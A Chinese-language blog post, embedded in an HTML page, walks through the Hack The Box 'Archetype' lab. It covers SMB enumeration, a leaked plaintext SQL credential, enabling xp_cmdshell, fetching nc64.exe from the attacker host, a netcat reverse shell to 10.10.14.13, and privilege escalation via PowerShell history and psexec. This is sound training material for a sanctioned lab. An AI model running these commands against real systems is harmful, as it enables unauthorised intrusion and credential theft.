@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>lab-hackthebox-Archetype-windowsRCE | Spencer</title><meta name="author" content="Spencer"><meta name="copyright" content="Spencer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="首先用openvpn连接到vpn服务，然后进行常规扫描 12nmap -sC -sV ipnmap -sS -Pn -n -p- --open ip --min-rate&amp;#x3D;5000 综合两次扫描结果，我们会发现很多服务  可以看出又是smb服务，那么我们又要用smbclient来看共享文件夹。 12"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.mathming.ltd/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":10,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: Spencer","link":"Link: ","source":"Source: Spencer","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'lab-hackthebox-Archetype-windowsRCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-06-03 11:07:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">117</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">24</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-gallery"></i><span> Gallery</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images.pexels.com/photos/1903702/pexels-photo-1903702.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Spencer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-gallery"></i><span> Gallery</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">lab-hackthebox-Archetype-windowsRCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-06-02T16:00:00.000Z" title="Created 2023-06-03 00:00:00">2023-06-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-06-03T03:07:38.042Z" title="Updated 2023-06-03 11:07:38">2023-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/hackthebox/">hackthebox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="lab-hackthebox-Archetype-windowsRCE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>首先用openvpn连接到vpn服务，然后进行常规扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV ip</span><br><span class="line">nmap -sS -Pn -n -p- --open ip --min-rate=5000</span><br></pre></td></tr></table></figure>
+<p>综合两次扫描结果，我们会发现很多服务</p>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603103031511.png" alt="image-20230603103031511"></p>
+<p>可以看出又是smb服务，那么我们又要用smbclient来看共享文件夹。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\ip\\</span><br><span class="line">-N:no password login</span><br><span class="line">-L: probe for services in target ip</span><br></pre></td></tr></table></figure>
+<p>然后我们进入没有权限限制的backups目录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N \\\\ip\backups</span><br></pre></td></tr></table></figure>
+<p>发现一个<code>prod.dtsConfig</code>文件，我们get下来并且查看。这个文件是我们登陆smb会话时，在目录中自动保存的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get prod.dtsConfig</span><br></pre></td></tr></table></figure>
+<p>拿到用户名密码</p>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603103429034.png" alt="image-20230603103429034"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名sql_svc密码Mag4c0rp123主机ARCHETYPE</span><br></pre></td></tr></table></figure>
+<p>我们需要连接到microsoft sql server简称<code>mssql</code></p>
+<p>这里采用通用连接工具<code>Impacket tool</code>可在github上下载，或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install impacket</span><br></pre></td></tr></table></figure>
+<p>但是注意，在python中下载之后，里面的工具脚本在python工具的默认安装位置，比如在kali系统中，所有安装的工具默认在<code>/usr/share/doc</code>或者<code>/usr/share/lib</code>等目录。</p>
+<p>本题在<code>/usr/share/doc/python3-impacket/examples</code>目录找到了所有工具里面的可以直接调用的脚本。</p>
+<p>impacket工具是一个<code>python class</code>的集合，用于不同网络协议部署。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py -h#本题用的工具</span><br></pre></td></tr></table></figure>
+<p>对于windows账户密码已知，我们直接登陆</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE/sql_svc@ip -windows-auth</span><br></pre></td></tr></table></figure>
+<p>进入<code>sql</code>命令行之后，我们检查是否有一些常见用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT is_svcrolemember(&#x27;sysadmin&#x27;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603104650377.png" alt="image-20230603104650377"></p>
+<p>说明存在。</p>
+<p>下面我们设置cmdshell用户直接执行系统命令。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>但是并没有开启这个功能，提示我们要先设置<code>advanced options</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">之后要重载配置</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>现在我们可以检查是否<code>xp_cmdshell</code>已经被激活。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmeshell <span class="string">&#x27;net user&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>发现已经成功，现在来利用<code>xp_cmdshell</code>执行系统命令。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603105106326.png" alt="image-20230603105106326"></p>
+<p>我们想要反弹shell，现在尝试上传一个<code>nc64.exe</code>到目标机器通过执行cmd反弹shell到监听端口。</p>
+<p>下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------">https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------</a></p>
+<p>然后在本地先起一个http服务用宇传输文件到靶机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>本地开启监听，等待反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+<p>下面在靶机发起对我们服务器的下载请求，先进行一些基本请求</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c pwd&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603105447966.png" alt="image-20230603105447966"></p>
+<p>然后发起下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.13/nc64.exe -outfile nc64.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>在python http监听可以看到下载。</p>
+<p>下面执行反弹shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.13 443&quot;</span><br></pre></td></tr></table></figure>
+<p>即可拿到shell。</p>
+<p>在Desktop目录可以看到<code>user.txt</code>拿到第一个flag。</p>
+<p>但是我们并没有拿到administrator用户。</p>
+<p>下面我们用<code>winPEAS</code>提权，这个工具会自动扫描漏洞。</p>
+<p>同样用wget</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">14.13</span>/winPEASx64.exe <span class="literal">-outfile</span> winPEASx64.exe</span><br></pre></td></tr></table></figure>
+<p>然后执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winPEASx64.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/image-20230603110341588.png" alt="image-20230603110341588"></p>
+<p>在linux中，我们过去执行的命令保存在<code>.bash_history</code>中，在windows中，命令会保存在<code>ConsoleHost_history.txt</code>，具体在<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</code>目录。</p>
+<p>我们进入并且查看</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+<p>成功看到administrator账户与其密码。</p>
+<p>下面进行提权，我们用刚才impacket tools中的psexec.py</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py adminstrator@ip</span><br></pre></td></tr></table></figure>
+<p>提权成功，在Desktop目录拿到flag。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://www.mathming.ltd">Spencer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://www.mathming.ltd/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/">http://www.mathming.ltd/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackthebox/">hackthebox</a></div><div class="post_share"><div class="social-share" data-image="https://images.pexels.com/photos/1903702/pexels-photo-1903702.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/07/2023-6-7-%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0(1)/"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">深度学习(1)</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/01/2023-6-1-css%E5%BC%80%E5%8F%91%E7%BB%83%E4%B9%A0/"><img class="next-cover" src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">css开发练习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/06/14/2022-6-14-windows%E6%BC%8F%E6%B4%9E/" title="windows漏洞"><img class="cover" src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-14</div><div class="title">windows漏洞</div></div></a></div><div><a href="/2022/05/21/2023-5-21-lab-hackthebox-Crocdile/" title="lab-hackthebox-Crocdile"><img class="cover" src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-21</div><div class="title">lab-hackthebox-Crocdile</div></div></a></div><div><a href="/2022/05/21/2023-5-21-lab-hackthebox-Three-rce/" title="lab-hackthebox-Three-rce"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-21</div><div class="title">lab-hackthebox-Three-rce</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Spencer</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">117</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MAGNC"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/MAGNC" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zxm_2002@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/07/2023-6-7-%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0(1)/" title="深度学习(1)"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="深度学习(1)"/></a><div class="content"><a class="title" href="/2023/06/07/2023-6-7-%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0(1)/" title="深度学习(1)">深度学习(1)</a><time datetime="2023-06-06T16:00:00.000Z" title="Created 2023-06-07 00:00:00">2023-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/" title="lab-hackthebox-Archetype-windowsRCE"><img src="https://images.pexels.com/photos/1903702/pexels-photo-1903702.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="lab-hackthebox-Archetype-windowsRCE"/></a><div class="content"><a class="title" href="/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/" title="lab-hackthebox-Archetype-windowsRCE">lab-hackthebox-Archetype-windowsRCE</a><time datetime="2023-06-02T16:00:00.000Z" title="Created 2023-06-03 00:00:00">2023-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/01/2023-6-1-css%E5%BC%80%E5%8F%91%E7%BB%83%E4%B9%A0/" title="css开发练习"><img src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="css开发练习"/></a><div class="content"><a class="title" href="/2023/06/01/2023-6-1-css%E5%BC%80%E5%8F%91%E7%BB%83%E4%B9%A0/" title="css开发练习">css开发练习</a><time datetime="2023-05-31T16:00:00.000Z" title="Created 2023-06-01 00:00:00">2023-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/28/2023-5-28-IPFS%E4%BD%BF%E7%94%A8%E7%AF%87/" title="IPFS使用篇"><img src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IPFS使用篇"/></a><div class="content"><a class="title" href="/2023/05/28/2023-5-28-IPFS%E4%BD%BF%E7%94%A8%E7%AF%87/" title="IPFS使用篇">IPFS使用篇</a><time datetime="2023-05-27T16:00:00.000Z" title="Created 2023-05-28 00:00:00">2023-05-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/21/2023-5-21-web3-ipfs-merkledags/" title="ipfs and Merkle DAGs in web3"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ipfs and Merkle DAGs in web3"/></a><div class="content"><a class="title" href="/2023/05/21/2023-5-21-web3-ipfs-merkledags/" title="ipfs and Merkle DAGs in web3">ipfs and Merkle DAGs in web3</a><time datetime="2023-05-20T16:00:00.000Z" title="Created 2023-05-21 00:00:00">2023-05-21</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://images.pexels.com/photos/1903702/pexels-photo-1903702.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Spencer</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="Chat"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container').forEach(node => {
+            if (node.hasAttribute('display')) {
+              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
+            } else {
+              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><script>function loadValine () {
+  function initValine () {
